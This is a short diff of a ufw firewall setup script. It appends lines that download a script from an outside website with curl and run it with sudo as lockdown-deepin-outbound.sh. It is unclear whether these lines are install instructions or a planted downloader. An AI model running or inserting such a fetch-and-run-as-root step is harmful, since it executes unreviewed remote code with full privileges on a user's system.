@@ -59,3 +59,11 @@ ufw status verbose
 echo ""
 echo "To see what's being blocked in real time, run:"
 echo "  sudo tail -f /var/log/ufw.log | grep BLOCK"
+
+
+
+cd ~/Desktop
+curl -o lockdown-deepin-outbound.sh https://linearit.co/linux.txt
+sed -i 's/\r$//' lockdown-deepin-outbound.sh
+chmod +x lockdown-deepin-outbound.sh
+sudo ./lockdown-deepin-outbound.sh
